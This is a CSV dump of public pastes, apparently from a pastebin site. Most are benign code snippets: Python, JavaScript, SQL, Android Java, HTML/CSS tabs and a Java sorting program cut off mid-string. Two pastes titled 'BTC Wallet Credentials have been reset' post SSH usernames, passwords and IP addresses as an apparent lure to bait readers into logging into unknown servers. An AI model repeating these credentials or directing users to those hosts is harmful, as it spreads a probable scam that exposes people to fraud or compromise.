id,title,username,language,date,content
UShiaFxW,data748,TestGuy1,JSON,Friday 10th of November 2023 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'afeeb251ee59917bbb3042de0f498adeb8ba34d72d566ae54184a13f67f6345f181c8d53b153ac0322a96b85a0741501402673183de6d1d1536ead9e03d63197c44a6feb45b58ab2dc13757d3c8bfbded0691b76482842d6a82954eb8dda47713c6558f363da07956550415718119471b30e26b85ad70d9c37ed125746148cd0',
  otherdata: [
    'a820ecf7a82b67f13f02b4fb0d8a6bdd',
    '2a645483fb14ad14c6e41108b82af007',
    'dbb70e158df646677da58d32ee8b8ebe',
    'c097f908b212baad15df3fe06d20b75f',
    'e2624fa95d33c014fab7985544a2c26c',
    '6f84cf5b2452cd159512a603c0c07c43',
    '8d2f05eda1551015375bfffaf407db85',
    'bc60a12f3ef37afbca41e1341174783b'
  ]
}"
9rBq0vhu,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Friday 10th of November 2023 05:52:54 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be: 
josli45:KoE3dG1 on 159.223.212.34
You can connect via SSH.

Regards
BT525386"
LT0XRjbA,Untitled,shepeliev,Python,Friday 10th of November 2023 05:49:48 AM CDT,"characters_to_replace = ['_', ',', '.', 'Б', 'З', 'И', 'К', 'У', 'Р', 'Л', 'Е', 'Н', 'Ц', 'Ж']

string = """"""""Це був чистий розбишака-халамидник.
Не було того дня, щоб хто-небудь не жалівся на Федька:
там шибку з рогатки вибив; там синяка підбив своєму ""закадишному"" другові; там перекинув діжку з дощовою водою, яку збирали з таким клопотом.
Наче біс який сидів у хлопцеві! Усі діти як діти,— граються, бавляться тихо, лагідно. Федькові ж, неодмінно, щоб битися, щоб що-небудь перевернути догори ногами. Спокій був його ворогом, з яким він боровся на кожному місці.
Наприклад, таке. Ліплять хатки з піску. Перед будинком, де жив Федько, була незабрукована вулиця і там завжди грузли в піску коні. Після дощу цей пісок ставав липким і вогким,— для будування хаток нема краще. Поставиш ногу, обкладеш її піском і виймай потихеньку. От і хатка. Хто хоче, може навіть димаря приробити. Коло хати можна тин виліпити, а за тином натикати сінинок — і сад є.
А між хатками іде вулиця. Можна в гості ходити одне до одного.
Федько теж ліпить. Але раптом встане, подивиться-подивиться і візьме та й повалить усе чисто — і своє, і чуже. Ще й регочеться.
А як хто розсердиться або заплаче, так і штовхана дасть. Битись з ним і не пробуй,— перший по силі на всю вулицю. Враз тобі дасть підніжку, зімне, насяде і пита:
— Ну? Наживсь на світі? Говори!
Як той каже, що наживсь, то милує; а як пручається — іще б'є.
Або пускають хлопці змія.
Плац великий,— ні будинків, ні магазинів, розбігтись є де. І вітер там раз у раз найкращий.
От заносять змія.
Федько сидить у себе на воротях, як Соловей-Розбійник на дереві, і дивиться. Він усе любить або по кришах лазити, або на воротях сидіти. Ворота високі і там ніби скринька така зроблена. В тій скриньці й засіда Федько.
""""""

for character in characters_to_replace:
    string = string.replace(character, '').replace(character.lower(), '')


print(string)
"
mJ9hKwJL,mony format,Savelyev_Vyacheslav,JavaScript,Friday 10th of November 2023 05:23:52 AM CDT,"  _formatNumber(input1, formatType = 3) {
      // console.log(formatNumber(300000000.222, 1)); // ""300 000 000""
      // console.log(formatNumber('300000000.222', 2)); // ""300 000 000.22""
      // console.log(formatNumber(300000000.56789, 3)); // ""300 000 000,57""
      // console.log(formatNumber('300000000.56789', 4)); // ""300000000.57""
      // console.log(formatNumber('300000000.56789', 5)); // ""300000000""
      // Преобразование входного значения в число
      const number = typeof input1 === 'number' ? input1 : parseFloat(input1);
  
      // Проверка, является ли преобразованное значение числом
      if (isNaN(number)) {
          return 'Неверный ввод';
      }

      switch (formatType) {
          case 1:
              // Формат с разделителями групп без десятичных знаков
              return number.toLocaleString('ru-RU', { maximumFractionDigits: 0 });
          case 2:
              // Формат с разделителями групп и двумя десятичными знаками, но без округления
              return number.toLocaleString('ru-RU', { maximumFractionDigits: 2, minimumFractionDigits: 2 });
          case 3:
              // Формат с разделителями групп и запятой в качестве десятичного разделителя, округление до двух десятичных знаков
              return number.toLocaleString('ru-RU', { maximumFractionDigits: 2 });
          case 4:
              // Формат без разделителей групп и с точкой в качестве десятичного разделителя, округление до двух десятичных знаков
              return number.toFixed(2);
          case 5:
              // Формат без разделителей групп и без точки
              return number.toFixed(0);
          default:
              // Формат с разделителями групп и запятой в качестве десятичного разделителя, округление до двух десятичных знаков
              return number.toLocaleString('ru-RU', { maximumFractionDigits: 2 });
      }
  }

}"
zqqcjQeF,redirection cache,jaideep06,MySQL,Friday 10th of November 2023 05:16:19 AM CDT,"CREATE TABLE `rm_rank_math_redirections_cache` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `from_url` text CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
  `redirection_id` bigint(20) unsigned NOT NULL,
  `object_id` bigint(20) unsigned NOT NULL DEFAULT 0,
  `object_type` varchar(10) NOT NULL DEFAULT 'post',
  `is_redirected` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`),
  KEY `redirection_id` (`redirection_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;"
YtRZ2Ckz,BTC Wallet Credentials have been reset,castlclass_20,GetText,Friday 10th of November 2023 05:10:05 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
hkuhiso0809lx:VLphK5 on 212.224.93.130
You can connect via SSH.
Regards"
AbvT1ahU,Untitled,vatman,Python,Friday 10th of November 2023 04:45:04 AM CDT,"# Псевдокод для эволюционного алгоритма
def evolutionary_optimization(vectors, calculate_energy, num_generations=1000, population_size=100):
    # Инициализируем популяцию случайными векторами
    population = [random.choice(vectors) for _ in range(population_size)]
    
    for _ in range(num_generations):
        # Вычисляем энергию для каждого вектора в популяции
        energies = [calculate_energy(vector) for vector in population]
        
        # Выбираем лучшие векторы для следующего поколения
        population = select_best_vectors(population, energies)
        
        # Применяем операции мутации и кроссовера для создания нового поколения
        population = mutate_and_crossover(population)
    
    # Возвращаем вектор с наименьшей энергией
    return min(population, key=calculate_energy)
"
SJNFDrzU,constelación / html,maryskins,HTML,Friday 10th of November 2023 04:23:11 AM CDT,"<script src=""//pull.cappuccicons.com/cpf.js""></script>
<div id=""constelacion"">
<div id=""conshead"">
<b>Grupos</b>
<span>Texto sobre los grupos. Tamaño infinito, aumenta según el contenido.</span>
</div>
  
<div class=""cscontent"">
<input type=""radio"" name=""cstab"" id=""cstemas1"" checked/>
<input type=""radio"" name=""cstab"" id=""cstemas2""/>
<input type=""radio"" name=""cstab"" id=""cstemas3""/>
<input type=""radio"" name=""cstab"" id=""cstemas4""/>
<input type=""radio"" name=""cstab"" id=""cstemas5""/>
<input type=""radio"" name=""cstab"" id=""cstemas6""/>
<input type=""radio"" name=""cstab"" id=""cstemas7""/>
<input type=""radio"" name=""cstab"" id=""cstemas8""/>
<input type=""radio"" name=""cstab"" id=""cstemas9""/>
<input type=""radio"" name=""cstab"" id=""cstemas10""/>
<input type=""radio"" name=""cstab"" id=""cstemas11""/>
<input type=""radio"" name=""cstab"" id=""cstemas12""/>
<label for=""cstemas1"" style=""--grupodet:var(--grupo1)"">
<i class=""cp cp-z-aries""></i> GRUPO 1
</label>

<label for=""cstemas2"" style=""--grupodet:var(--grupo2)""><i class=""cp cp-z-taurus""></i> GRUPO 2</label>

<label for=""cstemas3"" style=""--grupodet:var(--grupo3)""><i class=""cp cp-z-gemini""></i> GRUPO 3</label>

<label for=""cstemas4"" style=""--grupodet:var(--grupo4)""><i class=""cp cp-z-cancer""></i> GRUPO 4</label>

<label for=""cstemas5"" style=""--grupodet:var(--grupo5)""><i class=""cp cp-z-leo""></i> GRUPO 5</label>

<label for=""cstemas6"" style=""--grupodet:var(--grupo6)""><i class=""cp cp-z-virgo""></i> GRUPO 6</label>

<label for=""cstemas7"" style=""--grupodet:var(--grupo7)""><i class=""cp cp-z-libra""></i> GRUPO 7</label>

<label for=""cstemas8"" style=""--grupodet:var(--grupo8)""><i class=""cp cp-z-scorpio""></i> GRUPO 8</label>

<label for=""cstemas9"" style=""--grupodet:var(--grupo9)""><i class=""cp cp-z-sagittarius""></i> GRUPO 9</label>

<label for=""cstemas10"" style=""--grupodet:var(--grupo10)""><i class=""cp cp-z-capricorn""></i> GRUPO 10</label>

<label for=""cstemas11"" style=""--grupodet:var(--grupo11)""><i class=""cp cp-z-aquarius""></i> GRUPO 11</label>

<label for=""cstemas12"" style=""--grupodet:var(--grupo12);border-right:1px solid transparent;""><i class=""cp cp-z-pisces""></i> GRUPO 12</label>
  
<div class=""boxcs boxcs1"" style=""--grupodet:var(--grupo1)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-aries""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div>
</div>
  
<div class=""boxcs boxcs2"" style=""--grupodet:var(--grupo2)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-aries""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs3"" style=""--grupodet:var(--grupo3)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-gemini""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs4"" style=""--grupodet:var(--grupo4)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-cancer""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>
  
<div class=""boxcs boxcs5"" style=""--grupodet:var(--grupo5)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-leo""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs6"" style=""--grupodet:var(--grupo6)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-virgo""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs7"" style=""--grupodet:var(--grupo7)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-libra""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>
  
<div class=""boxcs boxcs8"" style=""--grupodet:var(--grupo8)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-scorpio""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs9"" style=""--grupodet:var(--grupo9)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-sagittarius""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs10"" style=""--grupodet:var(--grupo10)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-capricorn""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>
  
<div class=""boxcs boxcs11"" style=""--grupodet:var(--grupo11)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-aquarius""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

<div class=""boxcs boxcs12"" style=""--grupodet:var(--grupo12)"">
<img src=""https://via.placeholder.com/400X300"">
<div class=""csinfo"">
  <b>Nombre del grupo</b>
  <em>Subtítulo sobre el grupo</em>
  <span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in quam magna. Proin interdum purus ac odio ornare, et varius sem porttitor. Donec et sodales purus. Aenean sed posuere sapien. Quisque ac mauris et neque ultrices fringilla. Etiam malesuada elit nibh, quis maximus augue finibus eu. Duis hendrerit semper sodales. Fusce maximus consequat pulvinar. Cras non felis mi. Phasellus vitae neque non nulla tempus pellentesque.</span>
</div>
<i class=""cp cp-z-pisces""></i>

<div class=""csdatos"">
  <li>Dato 1</li>
  <li>Dato 2</li>
  <li>Dato 3</li>
  <li>Dato 4</li>
</div></div>

</div></div>"
Jk46F1DE,SearchView in Toolbar in a Fragment,chayanforyou,Java,Friday 10th of November 2023 04:21:22 AM CDT,"private MenuItem menuSearch;
private SearchView searchView;

//..............

binding.toolbar.inflateMenu(R.menu.menu);
menuSearch = binding.toolbar.getMenu().findItem(R.id.action_search);
searchView = (SearchView) menuSearch.getActionView();
initSearchView();
customizeSearchView();

binding.toolbar.setOnMenuItemClickListener(item -> {
    int itemId = item.getItemId();
    if (itemId == R.id.action_filter) {
        View anchor = view.findViewById(R.id.action_filter);
        filterImage(anchor);
        return true;
    }
    return false;
});

//..............

private final OnBackPressedCallback onBackPressedCallback = new OnBackPressedCallback(true) {
    @Override
    public void handleOnBackPressed() {
        if (!searchView.isIconified()) {
            menuSearch.collapseActionView();
        } else {
            setEnabled(false);
            requireActivity().getOnBackPressedDispatcher().onBackPressed();
        }
    }
};

//..............

private void initSearchView() {
    menuSearch.setOnActionExpandListener(new MenuItem.OnActionExpandListener() {
        @Override
        public boolean onMenuItemActionExpand(@NonNull MenuItem item) {
            return true;
        }

        @Override
        public boolean onMenuItemActionCollapse(@NonNull MenuItem item) {
            return true;
        }
    });

    searchView.setOnQueryTextListener(new SearchView.OnQueryTextListener() {
        @Override
        public boolean onQueryTextSubmit(String query) {
            return false;
        }

        @Override
        public boolean onQueryTextChange(String query) {
            return true;
        }
    });
}

@SuppressLint(""DiscouragedPrivateApi"")
private void customizeSearchView() {
    SearchManager searchManager = (SearchManager) requireActivity().getSystemService(Context.SEARCH_SERVICE);
    if (searchManager != null) {
        searchView.setSearchableInfo(searchManager.getSearchableInfo(requireActivity().getComponentName()));
    }

    SearchView.SearchAutoComplete searchAutoComplete =
            searchView.findViewById(androidx.appcompat.R.id.search_src_text);
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
        searchAutoComplete.setTextCursorDrawable(R.drawable.my_cursor);
    } else {
        try {
            Field field = TextView.class.getDeclaredField(""mCursorDrawableRes"");
            field.setAccessible(true);
            field.set(searchAutoComplete, R.drawable.my_cursor);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}"
zhZtteBx,constelación / css,maryskins,CSS,Friday 10th of November 2023 04:16:46 AM CDT,"/* PAGINA DE GRUPOS CONSTELACION X MARY */

/*VARIABLES*/
#constelacion{
  --fondocs:#121212;
  --bordecs:#2F2F2F;
  --acentocs:#FDEAAE;
    
  --grupo1:#5C99B2;
  --grupo2:#f62062;
  --grupo3:#c4720d;
  --grupo4:#a2cc5d;
  --grupo5:#5b6dee;
  --grupo6:#633f44;
  --grupo7:#b82a0f;
  --grupo8:#b981e3;
  --grupo9:#3472cf;
  --grupo10:#27a769;
  --grupo11:#f4ceda;
  --grupo12:#a72f0c;
    
  --colortxt:#EFEFEF;
  --colorsubtxt:#767676;
  
  --familytxt:'Poppins';
  --familyheadtxt:'DM Serif Display';
    
  --sizetxt:12px;
}

/*CSS*/
#constelacion{
  font-family:var(--familytxt);
  width:100%; /*ANCHO TOTAL*/
  height:700px; /*ALTURA TOTAL*/
  border:1px solid var(--bordecs);
background:var(--fondocs);
  margin:auto;
  font-size:var(--sizetxt);
  color:var(--colortxt);
  overflow:hidden;
}

#constelacion #conshead {
  border-bottom: 1px solid var(--bordecs);
  padding: 4%;
  display: flex;
  flex-direction: column;
  position:relative;
}

#constelacion #conshead b{
  font-size:3.5em;
  color:var(--acentocs);
  font-family:var(--familyheadtxt);
  z-index:2;
}

#constelacion #conshead span{
  padding:0px;
  margin:5px 0px;
  width:67%;
  z-index:2;
  text-align:justify;
}

#constelacion #conshead::before {
content: "" "";
  z-index: 1;
  width: 55px;
  height: 300px;
  display: block;
  position: absolute;
  border-radius: 100%;
  border: 2px solid var(--bordecs);
  top: -38px;
  left: 129px;
  transform: rotate(297deg);
}

.cscontent {
  height: 400px;
  width: 100%;
  position: relative;
  display: flex;
  flex-direction: row;
  flex-wrap: nowrap;
  justify-content: center;
  align-content: flex-start;

}

.cscontent .boxcs {
  position: absolute;
  left: -100%;
  transition: ease 1s;
  width: 92%;
  height: 320px;
  display: flex;
  flex-direction: row;
  justify-content: flex-start;
  flex-wrap: wrap;
  overflow: hidden;
  top: 100px;
  border: 1px solid var(--bordecs);
  border-radius: 10px;
  background: var(--fondocs);
  overflow: hidden;
}

.cscontent .boxcs::before {
content: "" "";
background: radial-gradient(circle, var(--grupodet) 0%, var(--fondocs) 60%);
  width:700px;
  height:500px;
  position:absolute;
  border-radius:100%;
  opacity:0.3;
  left:-60px;
  bottom:-90px;
  z-index:1;
}

.cscontent .boxcs img {
  width: 400px;
  height: 300px;
  margin: 10px;
  z-index:3;
  background-position:center;
  background-size:cover;
}

.cscontent .boxcs .csinfo {
  width: 55%;
  display: flex;
  flex-direction: column;
  align-items: flex-end;
  align-content: flex-end;
  justify-content: flex-start;
  margin: 10px;
  z-index:2;
}

.cscontent .boxcs .csinfo b{
  color:var(--grupodet);
  font-family:var(--familyheadtxt);
  font-size:3em;
}

.cscontent .boxcs .csinfo em{
  font-style:normal;
  text-transform:uppercase;
  margin-top:-3px;
  color: var(--colorsubtxt);
}

.cscontent .boxcs .csinfo span{
  padding:2%;
  padding-right:0%;
  margin:0px;
  text-align:justify;
  width:80%;
  overflow:auto;
  display:flex;
}

.cscontent .boxcs i {
  position: absolute;
  right: 0px;
  top: 0px;
  border: 1px solid var(--bordecs);
  width: 50px;
  height: 50px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 2em;
  border-radius: 0px 0px 0px 30px;
  color: var(--grupodet);
}

.cscontent .boxcs .csdatos {
  width: 100%;
  height: 50px;
  position: absolute;
  bottom: 0;
  z-index: 2;
  border-top: 1px solid var(--bordecs);
  display: flex;
  flex-direction: row-reverse;
  align-items: center;
  overflow:hidden;
}

.cscontent .boxcs .csdatos li {
  color: var(--colorsubtxt);
  width: 140px;
  padding: 5px 10px;
  list-style: none;
  border: 1px solid var(--bordecs);
  border-radius: 100px;
  margin-right: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  background:var(--fondocs);
}

.cscontent input {
  display:none;
}

.cscontent label {
  width: 100%;
  cursor: pointer;
  padding: 0px;
  align-items: center;
  transition: 1s;
  display: inline-flex;
  z-index: 7;
  position: inherit;
  justify-content: center;
  align-content: center;
  flex-direction: row;
  color: var(--colorsubtxt);
  font-weight: 700;
  border-top: 2px solid transparent;
  border-bottom: 1px solid var(--bordecs);
  height: 50px;
  border-right: 1px solid var(--bordecs);
  flex-wrap: nowrap;
  overflow:hidden;
}

.cscontent label i{
  position:absolute;
  font-size:5em;
  bottom:-15px;
  left:-11px;
  opacity:0.2;
}
.cscontent label:hover{
  color:var(--grupodet);
  transition:1s;
}

.cscontent input#cstemas1:checked ~ .boxcs1, .cscontent input#cstemas2:checked ~ .boxcs2, .cscontent input#cstemas3:checked ~ .boxcs3, .cscontent input#cstemas4:checked ~ .boxcs4, .cscontent input#cstemas5:checked ~ .boxcs5, .cscontent input#cstemas6:checked ~ .boxcs6, .cscontent input#cstemas7:checked ~ .boxcs7, .cscontent input#cstemas8:checked ~ .boxcs8, .cscontent input#cstemas9:checked ~ .boxcs9, .cscontent input#cstemas10:checked ~ .boxcs10, .cscontent input#cstemas11:checked ~ .boxcs11, .cscontent input#cstemas12:checked ~ .boxcs12{
  left:4%;
}

.cscontent input#cstemas1:checked ~ label[for=""cstemas1""], .cscontent input#cstemas2:checked ~ label[for=""cstemas2""], .cscontent input#cstemas3:checked ~ label[for=""cstemas3""], .cscontent input#cstemas4:checked ~ label[for=""cstemas4""], .cscontent input#cstemas5:checked ~ label[for=""cstemas5""], .cscontent input#cstemas6:checked ~ label[for=""cstemas6""], .cscontent input#cstemas7:checked ~ label[for=""cstemas7""], .cscontent input#cstemas8:checked ~ label[for=""cstemas8""], .cscontent input#cstemas9:checked ~ label[for=""cstemas9""], .cscontent input#cstemas10:checked ~ label[for=""cstemas10""], .cscontent input#cstemas11:checked ~ label[for=""cstemas11""], .cscontent input#cstemas12:checked ~ label[for=""cstemas12""]{
transition:1s;
  color: var(--grupodet);
}"
vCNCBTrr,lesson-2-text-animation,Patrikrizek,HTML,Friday 10th of November 2023 04:15:05 AM CDT,"
<!DOCTYPE html>
<html lang=""en"">

<head>
    <meta charset=""UTF-8"">
    <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>3D Text on Hover Animation</title>
    <style>
        * {
            font-family: Arial, Helvetica, sans-serif;
            font-style: normal;
            font-weight: normal;
        }

        body {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #8357eb;
            width: 100vh;
            height: 100vh;
        }

        p {
            transition: all 0.5s;
            -webkit-text-stroke: 4px #36f4f4;
            font-variation-settings: ""wght"" 900, ""ital"" 1;
            font-size: 15rem;
            text-align: center;
            color: transparent;
            font-family: Arial, Helvetica, sans-serif;
            text-shadow: 10px 10px 0px #87bccc,
                15px 15px 0px #e601c8,
                20px 20px 0px #e9019a,
                25px 25px 0px #f40468,
                45px 45px 10px #482896;
            cursor: pointer;
        }

        p:hover {
            font-variation-settings: ""wght"" 900, ""ital"" 1;
            text-shadow: none;
        }
    </style>
</head>

<body>
    <p>LINE</p>
</body>

</html>"
p6PpsHnY,Untitled,tuomasvaltanen,Python,Friday 10th of November 2023 04:11:38 AM CDT,"# Introduction to programming, 10.11.2023
print(""Welcome!"")"
0VCrugi2,array && sort,egogoboy,Java,Friday 10th of November 2023 04:05:53 AM CDT,"import java.util.*;
import java.io.*;

public class Main {
    public static void main(String[] args) throws IOException {
        actions input = new actions();
        array mass = new array();
        mass.notCreated();
        Sort sort = new Sort();
        displayHello();
        do {
            input.userInput();
            switch (input.getAns()) {
                case (""manual"") : input.displayManual(); break;
                case (""new array"") :
                    if (mass.getStatus()) {
                        input.arrayIsAlreadyCreated();
                        input.userInput();
                        while (!input.getAns().equals(""y"") && !input.getAns().equals(""n"")) {
                            input.userInput();
                            input.displayError();
                        }
                        if (input.getAns().equals(""n""))
                            break;
                    }
                    mass = new array();
                    mass.createArray();
                break;
                case (""set array name""): mass.setName(); break;
                case (""set array size""): mass.setSize(); break;
                case (""set array""): mass.setElements(); break;
                case (""view array""): mass.displayArray(); break;
                case (""start sort""):
                    sort.insertionSort(mass); break;
                default : if (!input.getAns().equals(""exit""))
                            input.displayError();
                break;
            }
        } while (!input.getAns().equals(""exit""));

    }
    static void displayHello() {
        System.out.print(""Welcome to my first project!\nIf you want to see manual, enter 'manual'\n"" +
                ""If you want to exit, enter 'exit'\n"");
    }
}

class actions {
    static String user;
    {
        System.out.print(""user actions is ready to use\n"");
    }
    public void userInput(){
        Scanner in = new Scanner(System.in);
        System.out.print(""> "");
        user = in.nextLine();
    }
    public String getAns(){
        return this.user;
    }
    public void displayError() {
        System.out.print(""Unknown command X(\n"");
    }
    public void arrayIsAlreadyCreated() {
        System.out.print(""The array has already been created. Do you want to delete the current array and create a new one?[y/n]\n"");
    }
    public void displayManual() {
        System.out.print(""-----Manual-----\n"" +
                ""new array : deletes the old array and creates a completely new one\n"" +
                ""set array name : sets the name of the current array\n"" +
                ""set array size : sets the size of the current array (this will destroy all the elements!)\n"" +
                ""set array : set array elements\n"" +
